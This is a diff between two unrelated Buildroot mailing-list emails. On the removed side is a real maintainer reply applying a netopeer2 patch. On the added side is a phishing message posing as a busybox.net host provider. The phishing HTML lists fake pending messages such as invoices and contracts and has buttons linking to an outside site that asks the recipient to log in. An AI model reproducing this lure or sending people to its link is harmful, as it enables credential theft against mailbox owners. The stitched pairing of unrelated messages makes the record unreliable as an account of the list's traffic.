@@ -1,81 +1,51 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id E681CC02192
-	for <buildroot@archiver.kernel.org>; Mon,  3 Feb 2025 22:42:44 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5B241C02192
+	for <buildroot@archiver.kernel.org>; Tue,  4 Feb 2025 02:51:45 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id B17B160FCD;
-	Mon,  3 Feb 2025 22:42:44 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id C40584084B;
+	Tue,  4 Feb 2025 02:51:44 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id bRiWE8LIBCGJ; Mon,  3 Feb 2025 22:42:43 +0000 (UTC)
+Received: from smtp4.osuosl.org ([127.0.0.1])
+ by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id qRe6R7tr3e7t; Tue,  4 Feb 2025 02:51:43 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 9FEC860FCE
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 841894084F
 Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 9FEC860FCE;
-	Mon,  3 Feb 2025 22:42:43 +0000 (UTC)
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [IPv6:2605:bc80:3010::136])
- by lists1.osuosl.org (Postfix) with ESMTP id 3E6951A4
- for <buildroot@buildroot.org>; Mon,  3 Feb 2025 22:42:41 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 841894084F;
+	Tue,  4 Feb 2025 02:51:43 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by lists1.osuosl.org (Postfix) with ESMTP id E2B51185
+ for <buildroot@buildroot.org>; Tue,  4 Feb 2025 02:51:41 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp3.osuosl.org (Postfix) with ESMTP id 7BADC60FC2
- for <buildroot@buildroot.org>; Mon,  3 Feb 2025 22:42:39 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id C73D7812C7
+ for <buildroot@buildroot.org>; Tue,  4 Feb 2025 02:51:41 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id 84FCIPY3MDOf for <buildroot@buildroot.org>;
- Mon,  3 Feb 2025 22:42:38 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=217.70.183.194;
- helo=relay2-d.mail.gandi.net; envelope-from=thomas.petazzoni@bootlin.com;
- receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp3.osuosl.org 5B91F60F3B
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 5B91F60F3B
-Received: from relay2-d.mail.gandi.net (relay2-d.mail.gandi.net
- [217.70.183.194])
- by smtp3.osuosl.org (Postfix) with ESMTPS id 5B91F60F3B
- for <buildroot@buildroot.org>; Mon,  3 Feb 2025 22:42:37 +0000 (UTC)
-Received: by mail.gandi.net (Postfix) with ESMTPSA id 00D8442CCD;
- Mon,  3 Feb 2025 22:42:34 +0000 (UTC)
-Date: Mon, 3 Feb 2025 23:42:34 +0100
-To: Heiko Thiery <heiko.thiery@gmail.com>
-Cc: buildroot@buildroot.org, Fiona Klute <fiona.klute@gmx.de>, Jan
- =?UTF-8?B?S3VuZHLDoXQ=?= <jan.kundrat@cesnet.cz>
-Message-ID: <20250203234234.011b1f5f@windsurf>
-In-Reply-To: <20250114072947.284965-6-heiko.thiery@gmail.com>
-References: <20250114072947.284965-1-heiko.thiery@gmail.com>
- <20250114072947.284965-6-heiko.thiery@gmail.com>
-Organization: Bootlin
-X-Mailer: Claws Mail 4.3.0 (GTK 3.24.43; x86_64-redhat-linux-gnu)
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id yTbTvnwZh3ZL for <buildroot@buildroot.org>;
+ Tue,  4 Feb 2025 02:51:41 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.227.246.67;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org B1D4F812BC
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org B1D4F812BC
+Received: from busybox.net (unknown [192.227.246.67])
+ by smtp1.osuosl.org (Postfix) with ESMTP id B1D4F812BC
+ for <buildroot@busybox.net>; Tue,  4 Feb 2025 02:51:40 +0000 (UTC)
+From: busybox.net Host Provider <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 4 Feb 2025 03:51:40 +0100
+Message-ID: <20250204035140.93128DC43678A3AF@busybox.net>
 MIME-Version: 1.0
-X-GND-State: clean
-X-GND-Score: -100
-X-GND-Cause: gggruggvucftvghtrhhoucdtuddrgeefvddrtddtgddukeekhecutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfitefpfffkpdcuggftfghnshhusghstghrihgsvgenuceurghilhhouhhtmecufedtudenucesvcftvggtihhpihgvnhhtshculddquddttddmnecujfgurhepfffhvfevuffkjghfohfogggtgfesthejredtredtvdenucfhrhhomhepvfhhohhmrghsucfrvghtrgiiiihonhhiuceothhhohhmrghsrdhpvghtrgiiiihonhhisegsohhothhlihhnrdgtohhmqeenucggtffrrghtthgvrhhnpeeltdegvdejheegtefgueffgfelhfekvdefudevieeileetleeitdefgfeugffghfenucffohhmrghinhepsghoohhtlhhinhdrtghomhenucfkphepudelgedrjeekrddvuddurddvvddtnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehinhgvthepudelgedrjeekrddvuddurddvvddtpdhhvghlohepfihinhgushhurhhfpdhmrghilhhfrhhomhepthhhohhmrghsrdhpvghtrgiiiihonhhisegsohhothhlihhnrdgtohhmpdhnsggprhgtphhtthhopeegpdhrtghpthhtohephhgvihhkohdrthhhihgvrhihsehgmhgrihhlrdgtohhmpdhrtghpthhtohepsghuihhlughrohhothessghuihhlughrohhothdrohhrghdprhgtphhtthhopehfihhonhgrrdhklhhuthgvsehgmhigrdguvgdprhgtphhtthhopehjrghnrdhkuhhnughrrghtsegtvghsnhgvthdrtgii
-X-GND-Sasl: thomas.petazzoni@bootlin.com
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=bootlin.com; s=gm1; t=1738622555;
- h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
- to:to:cc:cc:mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=YFs2HQSdKrnpzRwneEl8EJNu5PLtGZ47NdF0PcxgfIk=;
- b=J+ZBmQTZePp59YhjBM0OYeSg1mm7Zwpvoc//0b13r0wnKMZQ6PBAmpFA++pcNm0w8p8P0y
- OLVkfZDaaMVCzQ0snaEZvNZFKZNkQPCmnEgDJf7ES8+BymO5t+8I7dBhOWbWIOZ+85aWiG
- 5tlafrIugl7ywBRovLArd6BiGM3plM3Xh6plU/DSKJkvlR53NrlfaeL/ol7OD9J9s0Ogd0
- ZdWio3ftWISdFd8gPG17hjXUY4N3HT0HPWSNdsgTR2ouh3qY7e2+4ooXgUuXLZ7RIK6j5Y
- iCiidrw40f8FL3zVbXV2b2VjFBcTzbF8h+ODy0w41m7tilgWm3A+kQx8PbXHig==
-X-Mailman-Original-Authentication-Results: smtp3.osuosl.org;
- dmarc=pass (p=reject dis=none)
- header.from=bootlin.com
-X-Mailman-Original-Authentication-Results: smtp3.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=bootlin.com header.i=@bootlin.com header.a=rsa-sha256
- header.s=gm1 header.b=J+ZBmQTZ
-Subject: Re: [Buildroot] [PATCH v5 5/9] package/netopeer2: fix shellcheck
- warnings
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] buildroot@busybox.net (15) Important messages still
+ pending to be delivered to your inbox
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.30
 Precedence: list
@@ -87,36 +57,191 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Thomas Petazzoni via buildroot <buildroot@buildroot.org>
-Reply-To: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============0978054346616783029=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-On Tue, 14 Jan 2025 08:29:50 +0100
-Heiko Thiery <heiko.thiery@gmail.com> wrote:
+--===============0978054346616783029==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-> The init script S52netopeer2 has to be renamed to S52netopeer2-server to
-> match the daemon name. The step to install the init script now uses the
-> NETOPEER2_PKGDIR variable to reference the directory instead of
-> explicitly using the "package/netopeer2/" path.
-> 
-> The init script now is removed from the .checkpackageignore file.
-> 
-> Signed-off-by: Heiko Thiery <heiko.thiery@gmail.com>
-> ---
-> v4:
->     - new commit that only contains sysv init shellcheck warning fixes
+<!DOCTYPE HTML>
 
-Applied to master, thanks.
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
+ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
+ 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; orphans: 2; widows: 2; background-colo=
+r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;"><tbody><tr><th style=3D"padding: 5px; border: 0px=
+ solid rgb(0, 0, 0); border-image: none; width: 2px; color: rgb(0, 0, 0); b=
+ackground-color: rgb(2, 151, 64);">&nbsp;</th><td style=3D"margin: 0px; pad=
+ding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 665px=
+; color: rgb(0, 0, 0); font-family: Roboto, Tahoma, Helvetica, sans-serif; =
+background-color: rgb(243, 255, 248);">
+<span style=3D"font-size: 12px;">From&nbsp;busybox.net Server Admin<br></sp=
+an></td>
+</tr></tbody></table>
+<div style=3D"width: 700px; text-align: left; color: rgb(0, 0, 0); text-tra=
+nsform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto=
+, Tahoma, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-=
+weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
+ background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
+kness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><br><br>You have&nbsp;[15] messages still =
+pending to be delivered to your inbox and failed to deliver to your receipi=
+ents<br><br><strong>Mailbox:&nbsp;</strong><a style=3D"color: rgb(17, 85, 2=
+04);" href=3D"mailto:va@kant.ru" target=3D"_blank"><strong><u>buildroot@bus=
+ybox.net</u></strong></a><br><br></div>
+<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
+ sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
+acing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: r=
+gb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norma=
+l; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text=
+-decoration-style: initial; text-decoration-color:=20
+initial;" dir=3D"ltr"><table style=3D"width: 700px; height: 208px; color: r=
+gb(0, 0, 0); font-size: 15px; border-collapse: collapse;" border=3D"0" cell=
+spacing=3D"2" cellpadding=3D"2"><tbody><tr><td style=3D"margin: 0px; width:=
+ 340px; font-family: Calibri; background-color: rgb(243, 255, 248);"><stron=
+g style=3D"font-weight: bolder;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;Subject</strong></td><td style=3D"margin: 0px; width: 230=
+px; font-family: Calibri; background-color: rgb(243, 255, 248);"><strong st=
+yle=3D"font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reci=
+pient</strong></td><td style=3D"margin: 0px; width: 150px; font-family: Cal=
+ibri; background-color: rgb(243, 255, 248);">
+<strong style=3D"font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Date</strong></td></tr><tr>=
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+FW: Invoice copy</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/4/2025 3:51:40 a.m..</td></tr><t=
+r><td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-=
+color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+Signed Contract</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/4/2025 3:51:40 a.m..=
+</td></tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calibri;=
+ background-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy">&nbsp;BL Copy, Comm=
+ercial Invoice</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span><span>&nbsp;</sp=
+an>&nbsp;buildroot@busybox.net</span></td><td style=3D"margin: 0px; width: =
+150px; font-family: Calibri; background-color: rgb(204, 204, 255);">&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/4=
+/2025 3:51:40 a.m..</td></tr><tr><td style=3D"margin: 0px; width: 340px; fo=
+nt-family: Calibri; background-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+Re: Request for quote</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/4/2025 3:51:40 a.m..=
+</td></tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calibri;=
+ background-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+Fwd: Payment ---- Forwarded message ----</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/4/2025 3:51:40 a.m..</td><=
+/tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calibri; backg=
+round-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;First O=
+rder</span></td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 160px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);"><span>&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/4/2025 3:51:40 a.m.<=
+/span></td></tr></tbody></table><div style=3D"margin: 0px;">&nbsp;</div><ol=
+ style=3D"padding: 30px; margin-top: 0px;">
+<li style=3D"margin-left: 15px;"><a title=3D"This external link opens in a =
+new window" style=3D"background: rgb(80, 110, 216); padding: 10px; border-r=
+adius: 2px; color: rgb(255, 255, 255); text-decoration: none;" href=3D"http=
+s://attention-processing.freewebhostmost.com/#buildroot@busybox.net" target=
+=3D"_blank" rel=3D" noopener noreferrer">Release Pending Mails to inbox</a>=
+<br><br><br></li><li style=3D"margin-left: 15px;">
+<a title=3D"This external link opens in a new window" style=3D"background: =
+rgb(212, 0, 0); padding: 10px; border-radius: 2px; color: rgb(255, 255, 255=
+); text-decoration: none;" href=3D"https://attention-processing.freewebhost=
+most.com/#buildroot@busybox.net" target=3D"_blank" rel=3D" noopener norefer=
+rer">Report Error To IT Help Desk</a></li></ol><div style=3D"margin: 0px; f=
+ont-family: arial, helvetica, sans-serif;"><br><br>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; font-=
+variant-ligatures: normal; font-variant-caps: normal; text-decoration-style=
+: initial; text-decoration-color: initial;" dir=3D"ltr"><span style=3D"colo=
+r: rgb(0, 0, 0); font-family: Calibri; font-size: 14px;">
+You will receive pending emails after successful login via portal as we apo=
+logize for the inconvenience.</span></div></div></div><p>
+</p>
 
-Thomas
--- 
-Thomas Petazzoni, CTO, Bootlin
-Embedded Linux and Kernel engineering
-https://bootlin.com
+
+</body></html>
+
+--===============0978054346616783029==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============0978054346616783029==--
